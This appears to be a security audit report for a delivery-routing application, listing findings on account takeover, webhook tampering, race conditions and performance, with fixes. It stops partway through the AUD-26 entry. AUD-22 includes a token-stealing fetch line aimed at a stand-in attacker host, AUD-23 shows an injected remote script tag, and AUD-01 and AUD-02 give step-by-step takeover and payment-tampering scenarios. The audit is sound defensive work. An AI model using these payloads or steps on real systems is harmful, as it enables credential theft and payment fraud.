# FastRouteCO — Audit Report

Audit date: 2026-11-09. Scope: `backend/`, `web/`, `mobile/`, infrastructure, CI and docs.
Sources of truth: `README.md` (RF01–RF31, RNF01–RNF11), `docs/user-stories/user-stories.xlsx` (HU-01–HU-39), `docs/data-model/`, `docs/build-plan.md`.

## Summary

| ID | Dimension | Severity | CWE / OWASP | Location (file:line) | Finding | Status |
|---|---|---|---|---|---|---|
| AUD-01 | Security | Critical | CWE-306, CWE-620 / A01, A07 | `backend/src/modules/auth/auth.routes.ts:27`, `auth.controller.ts:149-160`, `auth.service.ts:273-311` | Unauthenticated invitation resend returns a valid password-reset token for any user | Open |
| AUD-02 | Security | Critical | CWE-345 / A08 | `backend/src/lib/wompi.ts:93-105`, `backend/src/modules/billing/billing.service.ts:1019-1085` | Wompi event checksum does not cover `reference`; the reference decides which product is granted | Open |
| AUD-03 | Security | Critical | CWE-362 / A04 | `backend/src/modules/billing/billing.service.ts:434-481` | Concurrent pay-per-use charges create two Wompi transactions for the same usage charge | Open |
| AUD-04 | Security | Critical | CWE-362, CWE-841 / A04 | `backend/src/modules/billing/billing.service.ts:1056-1126` | Concurrent Wompi webhooks can apply the same payment twice | Open |
| AUD-05 | Architecture | High | CWE-362 / A04 | `backend/src/modules/billing/billing.service.ts:346-416`, `1188-1200` | Credit and pay-per-use counters use read-modify-write and lose updates under concurrency | Open |
| AUD-06 | Architecture | High | CWE-362 / A04 | `backend/src/modules/routes/routes.service.ts:198-268`, `276-370`, `backend/prisma/schema.prisma:387-408` | Two requests can assign the same order to two routes; no unique constraint on `route_stops.order_id` | Open |
| AUD-07 | Performance | High | CWE-400 / A04 | `backend/src/lib/optimization.ts:44-78`, `backend/src/modules/routes/routes.service.ts:1157-1162` | 2-opt has no time budget or stop cap; RNF01 (10 s) is not measured | Open |
| AUD-08 | Performance | High | CWE-400 / A04 | `backend/src/lib/routing.ts:190-238` | Nearest-intersection queries scan every `Intersection` node | Open |
| AUD-09 | Performance | High | CWE-400 / A04 | `backend/src/modules/reports/reports.service.ts:32-35`, `95-100`, `157` | Report summary loads every GPS point in the range into memory | Open |
| AUD-10 | Performance | High | N/A (RNF01) | `backend/prisma/schema.prisma:326-441`, `555-591` | No indexes for the most frequent company, date and status filters | Open |
| AUD-11 | Architecture | High | N/A (build-plan, scheduled processes) | `backend/src/modules/billing/billing.service.ts:434-499` | Billing close, early charge, trial expiry and renewals have no scheduled execution | Open |
| AUD-12 | Reliability | High | CWE-703 / A04 | `backend/src/modules/orders/orders.service.ts:185-204` | Editing an order during a Nominatim outage erases its existing coordinates | Open |
| AUD-13 | Reliability | High | CWE-754 / A04 | `backend/src/index.ts:54`, `backend/src/lib/realtime.ts:38` | The API does not start if Redis is down and has no graceful shutdown | Open |
| AUD-14 | Security | High | CWE-212 / A01 | `mobile/src/features/auth/AuthContext.tsx:137-147` | Sign-out leaves the cached route, offline queue and evidence photos on the device | Open |
| AUD-15 | Reliability | High | N/A (RNF07) | `mobile/src/features/auth/AuthContext.tsx:98-102` | A cold start without network deletes the local session and logs the driver out | Open |
| AUD-16 | Security | High | CWE-307 / A07 | `backend/src/index.ts:27-30`, `backend/src/modules/auth/auth.routes.ts:22-27` | No rate limiting on login, refresh, invitation or card-setup endpoints | Open |
| AUD-17 | Testing | High | N/A (CI) | `.github/workflows/ci.yml:1-119` | CI only installs, tests and builds the backend | Open |
| AUD-18 | Reliability | High | N/A (deployment) | `backend/prisma/seed.ts:174` | Extra closing brace makes `pnpm db:seed` fail on a fresh deployment | Open |
| AUD-19 | Dependencies | High | N/A (CVEs) | `pnpm-lock.yaml` | `pnpm audit` reports 8 high, 7 moderate and 6 low vulnerabilities | Open |
| AUD-20 | Reliability | Medium | CWE-754 / A05 | `backend/src/index.ts:32-34` | `/health` always returns 200 without checking PostgreSQL, Redis or Neo4j | Open |
| AUD-21 | Security | Medium | CWE-345 / A07 | `backend/src/modules/auth/jwt.ts:36-42` | Access and refresh token payloads are not checked for `type` | Open |
| AUD-22 | Security | Medium | CWE-922 / A02 | `web/src/context/AuthContext.tsx:56-58`, `74-76` | Access and refresh tokens are stored in `localStorage` | Open |
| AUD-23 | Security | Medium | CWE-693 / A05 | `deploy/Caddyfile:15-21` | No Content-Security-Policy header | Open |
| AUD-24 | Reliability | Medium | CWE-1188 / A05 | `backend/src/env.ts:17-38` | Missing environment variables only produce a warning | Open |
| AUD-25 | Privacy | Medium | N/A (RF13, privacy) | `backend/src/modules/routes/routes.service.ts:650-675` | GPS history has no retention or purge policy | Open |
| AUD-26 | Security | Medium | CWE-668 / A01 | `backend/src/lib/realtime.ts:84-87`, `backend/src/modules/routes/routes.service.ts:562-675` | Every company user, including drivers, joins the company-wide socket room | Open |
| AUD-27 | Security | Low | CWE-922 / A02 | `mobile/src/features/auth/session-storage.ts:13-17` | The mobile web build stores tokens and PII in `localStorage` | Open |
| AUD-28 | Security | Low | CWE-204 / A07 | `backend/src/modules/auth/auth.controller.ts:41-50` | Login returns 403 and a different message for inactive users or companies | Open |

Totals: 4 Critical, 15 High, 7 Medium, 2 Low.

Top 5 risks:

1. AUD-01: any unauthenticated attacker can take over any account, including a platform administrator.
2. AUD-02: a valid Wompi event can be repointed to a different product and grant a paid plan without paying its price.
3. AUD-03 and AUD-04: concurrent requests can double-charge a company or duplicate credits and subscriptions.
4. AUD-09 and AUD-07: a 366-day report or a large route can exhaust the 4 GB production server.
5. AUD-10 and AUD-11: missing indexes and missing scheduled processes degrade the service as data grows and leave stale billing states.

## Details

### AUD-01 — Unauthenticated invitation resend returns a valid password-reset token

1. **Severity:** Critical. An attacker who knows a user UUID obtains a bearer token that sets that user's password. UUIDs are exposed in admin lists and in several API responses, so this is not a secret.
2. **CWE / OWASP:** CWE-306 Missing Authentication for Critical Function, CWE-620 Unverified Password Change; OWASP A01:2021 and A07:2021.
3. **Scenario:** The attacker sends `POST /api/v1/auth/resend-invitation/<platform-admin-uuid>` with no `Authorization` header. The response is `200 {"invitationUrl":"https://.../set-password?token=..."}`. The attacker calls `POST /api/v1/auth/accept-invitation` with that token and a new password, receives tokens, and owns the platform administrator account. The route has no `authenticate` middleware and `acceptInvitation` does not require an unset password.
4. **Fix:** Add `authenticate` and an explicit role/scope check, and never return the token in the response. In `auth.routes.ts:27`, mount `authenticate` and a handler that allows `platform_admin` for any user and `company_admin` only for users of their own company with role `supervisor` or `driver`. In `auth.service.ts:273`, accept the caller context and return only a boolean. In `auth.controller.ts:159`, return `{ message: 'Invitación reenviada' }`.
5. **Possible false positive:** None. The route is explicitly public today, and the service returns the raw token.

### AUD-02 — Wompi event checksum does not cover `reference`

1. **Severity:** Critical. The granted product is taken from `transaction.reference`, but Wompi signs only the fields listed in `signature.properties`. For `transaction.updated`, Wompi documents `transaction.id`, `transaction.status` and `transaction.amount_in_cents`; `reference` is not signed.
2. **CWE / OWASP:** CWE-345 Insufficient Verification of Data Authenticity; OWASP A08:2021.
3. **Scenario:** A company buys the cheapest monthly plan and receives a valid approved event. An attacker with access to that event body (support ticket, log export, proxy, or any system that stores webhook payloads) changes `data.transaction.reference` from `<paymentId>|subscription|<cheap-plan>|monthly` to `<same-paymentId>|subscription|<premium-plan>|annual`. The amount check still passes because `payment.amount` is unchanged, and `applySubscription` activates Premium annually. The same tampering upgrades a credit package, module or usage charge. Replaying the event without changing the reference is also possible because the payment status check is not atomic (AUD-04).
4. **Fix:** Bind the reference to server state. In `billing.service.ts:814`, `847`, `893` and `961`, append an HMAC of the reference payload computed with a server-side secret. In `parseReference`/`handleWompiEvent`, recompute the HMAC and reject mismatches before loading the payment. In `handleWompiEvent`, also verify `data.currency === 'COP'`, verify the payment `purpose` matches `kind`, and verify the plan/package/module/usage amount equals `payment.amount`.
5. **Possible false positive:** If Wompi included `transaction.reference` in `signature.properties`, the plain reference would be signed. The code must not rely on that: Wompi explicitly documents that `properties` can vary, and the code accepts any list without binding it to an expected set.

### AUD-03 — Concurrent pay-per-use charges create two transactions

1. **Severity:** Critical. The company is charged twice for the same usage period.
2. **CWE / OWASP:** CWE-362 Race Condition; OWASP A04:2021.
3. **Scenario:** The early-charge path in `routes.service.ts:1210` and the scheduled/manual close path call `processUsageCharge(companyId, usageChargeId)` at the same time for the same open charge. Both calls read `paymentId = null`, both create a `Payment`, both set the same `usageCharge.paymentId`, and both call Wompi with the same amount. Wompi charges the card twice; the second webhook overwrites the first payment id.
4. **Fix:** Claim the charge atomically. After creating the local payment, run `tx.usageCharge.updateMany({ where: { id, companyId, status: 'open', paymentId: null }, data: { paymentId } })` inside a transaction. If `count === 0`, delete the new payment and return `null`. Only the winner calls Wompi. Compare-and-set on `paymentId` is enough; no schema change is required.
5. **Possible false positive:** If Wompi enforced an idempotency key per transaction, duplicate calls would be deduplicated by the gateway. The code sends no idempotency key, so the gateway treats them as separate charges.

### AUD-04 — Concurrent Wompi webhooks apply the same payment twice

1. **Severity:** Critical. Duplicate credit purchases or subscriptions can be granted for one payment, which is a direct financial loss.
2. **CWE / OWASP:** CWE-362 Race Condition, CWE-841 Improper Enforcement of Behavioral Workflow; OWASP A04:2021.
3. **Scenario:** Wompi retries `transaction.updated` after a timeout, or two deliveries arrive at the same time. Both transactions read `payment.status === pending` in `approvePayment`, both update it to `approved`, and both run `applyCreditPurchase` or `applySubscription`. The company receives the credits or plan twice. The same race exists in `rejectPayment`.
4. **Fix:** Make the status transition the compare-and-set and apply effects only if it wins:
   `const updated = await tx.payment.updateMany({ where: { id: paymentId, status: PaymentStatus.pending }, data: { status: PaymentStatus.approved, ... } }); if (updated.count === 0) return;`
   Then apply the product effects in the same transaction. Do the equivalent for rejection. The unique `gatewayReference` already prevents two different transactions from being stored, but it does not prevent double effects.
5. **Possible false positive:** Wompi may serialize deliveries in practice. The code still receives retries on non-200 responses and can run multiple backend instances (RNF06), so the race is real.

### AUD-05 — Credit and pay-per-use counters lose updates

1. **Severity:** High. Companies can receive free optimizations or be undercharged, and credit balances drift from the transaction log.
2. **CWE / OWASP:** CWE-362 Race Condition; OWASP A04:2021.
3. **Scenario:** Two optimizations run concurrently for the same company. Both read `usageCharge.optimizationCount = 4`, both write `5` and both compute the amount for 5; the company pays for one optimization instead of two. In credit mode, both read `planCredits = 10` and write `9`, so two optimizations consume one credit. `applyCreditPurchase` also reads `balance.extraCredits` and writes `balance + pkg.credits`, so a concurrent purchase can be lost.
4. **Fix:** Serialize billing writes per company with a transaction-scoped PostgreSQL advisory lock at the start of `applyOptimizationBilling` and the payment apply functions, or replace every read-modify-write with atomic Prisma operations. For credits, use `updateMany({ where: { companyId, planCredits: { gt: 0 } }, data: { planCredits: { decrement: 1 } } })` and fall back to `extraCredits`. For pay-per-use, use a single `UPDATE ... SET optimization_count = optimization_count + 1, amount = (...) RETURNING`. For purchases and renewals, use `increment`/`decrement`, not `balance + value`.
5. **Possible false positive:** Tests and single-user usage hide it. The production target allows multiple concurrent users and the code is explicitly designed for more than one backend instance.

### AUD-06 — The same order can be assigned to two routes

1. **Severity:** High. Duplicate stops corrupt route order, distances and driver instructions, and can cause the same delivery to be completed twice.
2. **CWE / OWASP:** CWE-362 Race Condition; OWASP A04:2021.
3. **Scenario:** Two supervisors assign the same pending order at the same time. Both requests read `status = pending`, both find no existing `routeStop`, and both create a stop in different routes. The database has `@@unique([routeId, sequence])` but no uniqueness for `orderId`, so both inserts succeed.
4. **Fix:** Claim the order before creating the stop. In the transaction, run `tx.order.updateMany({ where: { id: orderId, companyId, status: OrderStatus.pending }, data: { status: OrderStatus.assigned } })` and throw a conflict if `count === 0`; do the same for the bulk `createRoute` path with `status: pending` and verify the updated count equals the requested count. Keep the existing pre-checks for friendly errors. Adding a partial unique index on `route_stops.order_id` would be the durable constraint, but that is a schema change and needs approval.
5. **Possible false positive:** None while there is no unique constraint and the check is outside the write path.

### AUD-07 — 2-opt has no time budget or stop cap and RNF01 is unmeasured

1. **Severity:** High. The 10-second optimization requirement cannot be guaranteed, and a large route can exhaust CPU and block a Node.js worker.
2. **CWE / OWASP:** CWE-400 Uncontrolled Resource Consumption; OWASP A04:2021.
3. **Scenario:** A company creates a route with hundreds of stops. `twoOptImprove` runs `while (improved)` and rebuilds the full path for every `(start, end)` pair; each pass is O(n²) and every candidate evaluation is O(n), so the loop is O(n³) per pass and can iterate many times. The HTTP request holds the event loop and the database transaction open while Neo4j runs one Dijkstra query per origin. No maximum number of stops is defined in `docs/build-plan.md`, so the failure point is not bounded.
4. **Fix:** Add a hard time budget (`performance.now()` deadline) and a maximum number of improvement passes to `twoOptImprove`, and return the best path found. Read the maximum stops per route from a single setting once the business rule is defined. Measure the full path with a realistic OSRM/Neo4j graph and record the result in the audit. Do not invent a stop limit while it is `[TO BE DEFINED]`.
5. **Possible false positive:** With the current `DEFAULT_BBOX` and small school routes, the algorithm may stay under 10 s. This does not remove the unbounded worst case.

### AUD-08 — Nearest-intersection queries scan the whole graph

1. **Severity:** High. The distance matrix calls this query once per origin, so the cost grows with the entire imported graph and not with the area around the route.
2. **CWE / OWASP:** CWE-400 Uncontrolled Resource Consumption; OWASP A04:2021.
3. **Scenario:** `nearestNodes` runs `MATCH (n:Intersection) WHERE n.location IS NOT NULL` and computes `point.distance` for every node, ordering the full set per point. `nearestNode` does the same with `LIMIT 1`. On a city-sized graph this is a full label scan plus a sort, and it is executed for each matrix origin in `distanceMatrix`.
4. **Fix:** Use the existing point index from `src/scripts/osm-import.ts:169` with a bounded search: filter with `point.withinBBox(n.location, point({srid:4326, x: $minLon, y: $minLat}), point({srid:4326, x: $maxLon, y: $maxLat}))` for the 3 km radius, then order by distance. If the index is not used, verify with `PROFILE` and add a dedicated index/query pattern. Fall back to the approximate matrix when no node is found.
5. **Possible false positive:** If the deployed Neo4j plan chooses an index-backed plan for the current query, the scan may be avoided. The query text does not contain an indexable predicate, so this needs `PROFILE` verification.

### AUD-09 — Report summary loads the full GPS history into memory

1. **Severity:** High. A 366-day report can load millions of rows into a 4 GB server and crash the process.
2. **CWE / OWASP:** CWE-400 Uncontrolled Resource Consumption; OWASP A04:2021.
3. **Scenario:** A company administrator requests `/api/v1/company/summary?from=2025-01-01&to=2025-12-31`. `reportRouteInclude.locations` selects every `RouteLocation` for every route, and `routeActualDistanceM` reduces them in Node. At one point every 5 s per driver, 100 drivers produce about 630 million points per year; even 10 drivers produce 63 million points. The request also blocks the event loop while the rows are serialized.
4. **Fix:** Remove `locations` from `reportRouteInclude`. Compute `actualDistanceM` in PostgreSQL with one aggregate query over `route_locations` using `lag()` and the haversine formula (or a bounded per-route query), returning `routeId, distanceM`. Join that map to the route rows. Add a test with a small fixture that compares the SQL result with the current JS result.
5. **Possible false positive:** The range is capped at 366 days and the client may request short ranges. The API accepts the full range, so the worst case is reachable.

### AUD-10 — Missing indexes on frequent filters

1. **Severity:** High. As data grows, lists and reports degrade to sequential scans on the production server.
2. **CWE / OWASP:** N/A. Affected requirement: RNF01 and RNF03/RNF05 performance.
3. **Scenario:** `/api/v1/orders?status=pending`, `/api/v1/routes?date=...`, incidents by company/status, payments by company, usage charges by company/period and the reports query all filter by `companyId` plus date or status. `schema.prisma` only defines `RouteLocation(routeId, capturedAt)`, `RefreshToken(userId)` and `Notification(userId)`. PostgreSQL must scan full tables, and the report query scans `routes` by company and date.
4. **Fix:** Add composite indexes in a Prisma migration: `Order(companyId, status, createdAt)`, `Route(companyId, routeDate, status)`, `RouteStop(routeId)`, `RouteStop(orderId)` (partial unique is better, see AUD-06), `Incident(companyId, status, reportedAt)`, `Payment(companyId, status, createdAt)`, `UsageCharge(companyId, status, periodStartDate)`, `CreditTransaction(companyId, type, transactionDate)` and `User(companyId, role, isActive)`. This changes the database schema and needs approval before implementation.
5. **Possible false positive:** Some indexes may already exist in migrations but not in the Prisma schema. The schema is the source used by `prisma migrate`, so the omission is still a defect.

### AUD-11 — Scheduled billing and expiry processes do not exist

1. **Severity:** High. Companies can keep expired trials or subscriptions, usage periods are not closed, and early charges only happen when someone optimizes again.
2. **CWE / OWASP:** N/A. Affected requirement: audit section 4.2 (scheduled processes) and the billing rules in the README/build-plan.
3. **Scenario:** A company's trial expires at midnight. The administrator stops using the app. No process runs, so the company stays `active` in the database, no expiry notification is sent, and the next request may still be allowed until a lazy check runs. A pay-per-use company that stops optimizing is never charged for the open period. An annual plan's monthly credit reset only happens when somebody opens billing.
4. **Fix:** Define the execution model before implementing it. The build-plan currently documents lazy billing, so switching to a scheduler changes a business rule. The minimal implementation inside the current stack is a CLI entry point (`backend/src/scripts/billing-jobs.ts`) that iterates companies and calls `syncCompanySubscription`, `processClosingUsageCharges`, annual credit reset and trial-expiry notifications, guarded by a PostgreSQL advisory lock to prevent concurrent runs and documented as a cron/systemd timer in `America/Bogota` in the deployment README. Do not implement until the business decision is confirmed.
5. **Possible false positive:** If lazy billing is an accepted design deviation, the missing scheduler is a documented risk rather than a bug. It still leaves inactive companies uncharged and unnotified.

### AUD-12 — Order edit erases coordinates during a geocoder outage

1. **Severity:** High. Data loss: the already validated coordinates are replaced with `null` and the route can no longer be optimized.
2. **CWE / OWASP:** CWE-703 Improper Check or Handling of Exceptional Conditions; OWASP A04:2021.
3. **Scenario:** An order has valid coordinates. Nominatim is down. A supervisor edits the customer phone and resubmits the same address. `geocodeAddress` catches the outage and returns `{ latitude: null, longitude: null, geocoded: false }`; `coordinates` is truthy, so `orders.service.ts:201-202` writes `latitude: null` and `longitude: null`. The order loses its location even though the address did not change successfully.
4. **Fix:** Distinguish "address unchanged" from "geocoding failed". In `updateOrder`, only write coordinates when `coordinates.latitude !== null && coordinates.longitude !== null`; when the geocoder is unavailable, keep the existing coordinates and return the warning. Optionally treat an unavailable geocoder as a non-blocking warning while preserving old values. Add a test where the fake geocoder throws and the order's coordinates remain unchanged.
5. **Possible false positive:** If the address really changed and cannot be geocoded, keeping old coordinates is also wrong; the fix should keep them only when the address is unchanged or when the geocoder is unavailable, and surface a warning.

### AUD-13 — Redis is a hard startup dependency and shutdown is not graceful

1. **Severity:** High. A Redis restart takes the API down; a container stop can drop in-flight requests and leave connections open.
2. **CWE / OWASP:** CWE-754 Improper Check or Handling of Exceptional Conditions; OWASP A04:2021.
3. **Scenario:** The backend starts while Redis is restarting. `await initRealtime(server)` rejects or hangs at `realtime.ts:38`, so `server.listen` is never reached. A deploy or `docker stop` sends SIGTERM; the process has no handler, so Node exits without closing the HTTP server, Prisma, Redis or Socket.IO, and clients see abrupt disconnects.
4. **Fix:** Wrap `initRealtime` in a bounded connect attempt (for example a 5 s timeout with `connectTimeout`/`maxRetriesPerRequest`). On failure, start the HTTP server with the default in-memory Socket.IO adapter and log a critical alert; the adapter can be initialized on the next restart. Add `SIGTERM`/`SIGINT` handlers in `index.ts` that call `server.close()`, `closeRealtime()`, `prisma.$disconnect()` and exit. Add a unit test for the shutdown sequence with mocked clients.
5. **Possible false positive:** Failing fast on a required dependency is a valid design. The risk is that the current failure is an unhandled hang during startup, not a controlled, observable fail-fast.

### AUD-14 — Sign-out leaves route data and evidence on the device

1. **Severity:** High. Personal data (student names, addresses, GPS trail, photos) remains readable to the next person who uses the shared device.
2. **CWE / OWASP:** CWE-212 Improper Removal of Sensitive Information Before Storage or Transfer; OWASP A01:2021.
3. **Scenario:** A driver signs out on a shared phone. `AuthContext.signOut` clears the tokens and the four `SecureStore` keys, but `route_cache`, `offline_queue` and the `evidence` directory are untouched. The next driver can open the app, and the queue or files can be read with a file browser or a debug build. The cached route is also returned for the same business date.
4. **Fix:** Add `clearOfflineData()` in `mobile/src/features/route/offline-db.ts` that deletes `route_cache` and `offline_queue` in SQLite, removes evidence files and deletes the legacy JSON files. Call it from `resetSession` in `AuthContext.tsx` before clearing the tokens and from the session-expired handler. Add a test that inserts a cached route and a queued action, calls the clear function and verifies both are empty and the evidence directory is gone.
5. **Possible false positive:** If the device is not shared, the data is still personal data and survives a logout, which violates the expected "log out = no local session".

### AUD-15 — Cold start without network logs the driver out

1. **Severity:** High. This breaks RNF07: a driver cannot open the app offline, even with a valid stored session and today's cached route.
2. **CWE / OWASP:** N/A. Affected requirement: RNF07 (offline mode).
3. **Scenario:** The driver starts the shift in an area without coverage. `AuthProvider` loads the stored session, then calls `authApi.me()`. The request fails with a network error, the `catch` block runs `resetSession()`, and the driver is sent to login. The cached route is unreachable because the session is gone.
4. **Fix:** Do not clear the session on network/timeout errors. In the cold-start `catch`, inspect the Axios error: only reset on `401`/`403`; for network errors, set the user from `storedSession.user` and keep the session. Optionally retry `me()` when connectivity returns. Add a unit test for the error classifier and for the cold-start path with a rejected network request.
5. **Possible false positive:** If the app always has connectivity at cold start, the bug does not appear. The offline requirement explicitly covers the no-connectivity case.

### AUD-16 — No rate limiting on authentication and invitation endpoints

1. **Severity:** High. Credential stuffing and invitation-token guessing are unthrottled, and the unauthenticated resend endpoint (AUD-01) makes brute force worse.
2. **CWE / OWASP:** CWE-307 Improper Restriction of Excessive Authentication Attempts; OWASP A07:2021.
3. **Scenario:** An attacker sends thousands of `POST /api/v1/auth/login` requests per minute from one IP or a botnet. The backend performs a bcrypt comparison for every attempt and never blocks the source. The same applies to `/auth/refresh`, `/auth/accept-invitation` and `/auth/resend-invitation`. This is both a credential-guessing and a CPU-exhaustion vector on a 4 GB server.
4. **Fix:** Add a small Redis-backed fixed-window or sliding-window limiter using the existing `ioredis` dependency, with an injected store interface for tests. Apply strict limits to login and invitation endpoints (for example 10 attempts per 15 minutes per IP + email) and a broader limit to the rest of `/api/v1`. Do not add a new dependency; if a library is preferred, it needs approval.
5. **Possible false positive:** A reverse proxy or CDN may rate-limit in production. The repository's Caddy configuration does not, so the backend is exposed.

### AUD-17 — CI checks only the backend

1. **Severity:** High. Web and mobile regressions can reach `main` without lint, typecheck or tests.
2. **CWE / OWASP:** N/A. Affected audit item: section 4.4 (CI coverage).
3. **Scenario:** A developer changes `web/src` or `mobile/src` and opens a pull request. CI runs `pnpm install`, lint, typecheck, tests and build only in `backend`; the web and mobile code is never compiled in CI. A TypeScript error or broken test in those apps is merged and only appears during deployment.
4. **Fix:** Extend `.github/workflows/ci.yml` with jobs or steps that run `pnpm install --frozen-lockfile` at the repository root (or per workspace), then `pnpm --filter web lint`, `typecheck`, `test`, `build` and `pnpm --filter mobile lint`, `typecheck`, `test`. There is no mobile build script today; add a documented Expo export check only if the deployment uses a web/mobile bundle.
5. **Possible false positive:** If branch protection or an external pipeline already covers the other apps, the repository workflow is still incomplete and not reproducible from the code.

### AUD-18 — Seed script has a syntax error

1. **Severity:** High. A fresh deployment that follows the README fails at `pnpm db:seed`, so the plans, modules, settings and demo data are missing.
2. **CWE / OWASP:** N/A. Affected item: deployment instructions.
3. **Scenario:** On a new server, the operator runs `pnpm --filter backend db:seed`. `tsx` parses `prisma/seed.ts` and fails at line 174 with an unexpected `}` because `seedPlanModules` already closes at line 173. The seed never runs. `tsc` does not catch it because `tsconfig.json` excludes `prisma`.
4. **Fix:** Delete the extra closing brace at `backend/prisma/seed.ts:174`. Add a minimal CI step that parses the seed file (for example `pnpm --filter backend exec tsx --check prisma/seed.ts` or a dedicated smoke test) so this cannot regress. Verify by running the seed against the test database.
5. **Possible false positive:** None. The file has a visible extra brace.

### AUD-19 — Known dependency vulnerabilities

1. **Severity:** High. `pnpm audit` reports 8 high, 7 moderate and 6 low advisories. `body-parser` is reachable from the public API and has a denial-of-service advisory; `follow-redirects` is used by axios in all three apps; `node-forge` is pulled by the Expo CLI.
2. **CWE / OWASP:** N/A. Affected audit item: section 4.1 (dependencies).
3. **Scenario:** An attacker sends a compressed request with trailing bytes to the Express API and triggers the `body-parser` DoS. A malicious redirect from an external service used by axios can leak credentials or follow an unexpected redirect. The Expo CLI vulnerabilities affect developer machines/builds, not the production runtime.
4. **Fix:** Update within the current major versions: `express`/`body-parser` to a release that includes `body-parser >= 2.4.0`, `axios` to a release that includes `follow-redirects >= 1.16.2`, and the Expo SDK patch that updates `node-forge` if available. This is a dependency update and needs approval before running `pnpm update`.
5. **Possible false positive:** Audit results change over time and some paths are development-only. Re-run `pnpm audit --prod` after the update and document the remaining advisories.

### AUD-20 — `/health` does not check dependencies

1. **Severity:** Medium. A healthy-looking process can be unable to serve requests.
2. **CWE / OWASP:** CWE-754 Improper Check or Handling of Exceptional Conditions; OWASP A05:2021.
3. **Scenario:** PostgreSQL or Redis is down. `/health` still returns `{"status":"ok"}`. A load balancer or deployment script keeps sending traffic to the instance, and the operator does not get an early warning.
4. **Fix:** Make `/health` execute `prisma.$queryRaw\`SELECT 1\`` and a Redis `PING` (and optionally a short Neo4j `RETURN 1`), with a timeout. Return `503` with a per-dependency status when a critical dependency is unavailable. Keep the current response shape for compatibility and add a test with a mocked failing client.
5. **Possible false positive:** If Caddy or the deployment only uses the endpoint for liveness, not readiness, the current behavior is intentional. The repository does not document that distinction.

### AUD-21 — JWT payload `type` is not validated

1. **Severity:** Medium. A token signed with one secret is accepted by the other verifier if the secrets are ever equal or misconfigured, and the code does not assert the intended token kind.
2. **CWE / OWASP:** CWE-345 Insufficient Verification of Data Authenticity; OWASP A07:2021.
3. **Scenario:** An operator sets `JWT_SECRET` and `JWT_REFRESH_SECRET` to the same value. An access token (with `type: 'access'`) can be sent to `/auth/refresh`; `verifyRefreshToken` accepts it because it only verifies the signature, then looks up `jti`, which is absent and fails later. Conversely, a refresh token can be used as a Bearer access token; `authenticate` only verifies the signature, and `payload.sub` is present, so it accesses the API for up to 7 days. The `type` field exists but is never checked.
4. **Fix:** In `jwt.ts`, after `jwt.verify`, assert `payload.type === 'access'` in `verifyAccessToken` and `payload.type === 'refresh'` in `verifyRefreshToken`; throw on mismatch. Also validate the required fields (`sub`, `jti` for refresh). Add unit tests for both directions.
5. **Possible false positive:** The current deployment uses distinct secrets, so the cross-token path is not exploitable today. The missing check is still a defense-in-depth defect and the condition is not enforced anywhere.

### AUD-22 — Web tokens are stored in `localStorage`

1. **Severity:** Medium. Any XSS in the web app can read long-lived refresh tokens; there is no confirmed XSS today.
2. **CWE / OWASP:** CWE-922 Insecure Storage of Sensitive Information; OWASP A02:2021.
3. **Scenario:** A dependency or a future feature introduces an XSS. The attacker injects `fetch('https://attacker/?t='+localStorage.getItem('refresh_token'))` and obtains a 7-day refresh token. Even without XSS, any script running on the origin can read both tokens. The access token is short-lived, but the refresh token is not.
4. **Fix:** Move the refresh token to an `HttpOnly`, `Secure`, `SameSite=Strict` cookie set by the backend and keep the access token in memory; add a CSRF token for the refresh endpoint. If a full cookie migration is out of scope, at minimum stop persisting the refresh token in `localStorage` and keep it in memory for the tab session. This is a design change and should be scheduled, not improvised.
5. **Possible false positive:** The app may not be publicly exposed or may have no XSS. Storing bearer credentials in `localStorage` is still a recognized weakness.

### AUD-23 — No Content-Security-Policy

1. **Severity:** Medium. CSP is a defense-in-depth control against XSS and script injection.
2. **CWE / OWASP:** CWE-693 Protection Mechanism Failure; OWASP A05:2021.
3. **Scenario:** An attacker finds an HTML injection in a user-controlled field rendered by the web app. Without CSP, an injected `<script src="https://attacker/x.js">` executes and can read `localStorage` tokens (AUD-22) or call the API as the user. `helmet()` on the API does not protect the static web app served by Caddy.
4. **Fix:** Add a CSP header in `deploy/Caddyfile` for the web handler, starting with `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.<domain> wss://api.<domain>; font-src 'self'; frame-ancestors 'none'; base-uri 'self'`. The map tiles and WebSocket origins must be added to `connect-src`/`img-src`. Test in report-only mode first.
5. **Possible false positive:** The exact CSP depends on MapLibre tile and worker URLs. The absence of any policy is still the finding.

### AUD-24 — Environment validation only warns

1. **Severity:** Medium. A misconfigured production instance starts and fails at request time with unclear errors.
2. **CWE / OWASP:** CWE-1188 Insecure Default Initialization of Resource; OWASP A05:2021.
3. **Scenario:** An operator forgets `JWT_SECRET` or `WOMPI_EVENTS_SECRET`. `env.ts` logs `Missing env var` and continues. The instance listens on the port, passes `/health`, and only when a user logs in or a webhook arrives does it throw a runtime error. In the Wompi case, `verifyWompiEvent` returns `false`, so all payments are rejected and the failure looks like a signature problem.
4. **Fix:** Validate the required variables at startup and exit with a non-zero code and a clear message when any is missing, except in test mode. Use `zod` to parse `process.env` with types and formats (URLs, durations). Keep the current warning for optional variables. Add a unit test for the parser with a missing variable.
5. **Possible false positive:** Some variables may be intentionally optional in local development. The required list is already explicit in `env.ts`; the issue is that it is not enforced.

### AUD-25 — GPS history has no retention or purge policy

1. **Severity:** Medium. Unbounded personal data growth increases storage cost and privacy exposure; the exact retention period is not defined.
2. **CWE / OWASP:** N/A. Affected requirements: RF13 (GPS trail) and privacy.
3. **Scenario:** A driver sends one point every 5 s for a year. Every point is stored forever in `route_locations`; reports and backups grow without limit, and a data subject request cannot be answered with a defined retention rule. There is no job or documented policy to delete points after a period.
4. **Fix:** Define the retention period with the product owner (`[TO BE DEFINED]`). Once defined, add a documented purge job (cron/systemd timer) that deletes `route_locations` older than the period, optionally preserving an aggregated daily trail. Do not delete data before the policy exists.
5. **Possible false positive:** The business may require indefinite retention for audits. That decision must be recorded; the current code has no policy at all.

### AUD-26 — Drivers receive company-wide socket events

1. **Severity:** Medium. A driver can receive events for other drivers' routes, orders and incidents inside the same company.
2. **CWE / OWASP:** CWE-668 Exposure of Resource to Wrong Sphere; OWASP A01:2021.
3. **Scenario:** Every authenticated socket joins `company:<companyId>` (`realtime.ts:85`). `emitToCompany` broadcasts `route:location`, `route:status`, `route:stop-status`, `route:reassigned`, `incident:created` and `incident:message` to the whole room. A driver's client can listen for another route's events if it knows or guesses the route id, and the payloads include stop/incident data. The HTTP endpoints enforce driver ownership, but the socket layer does not.
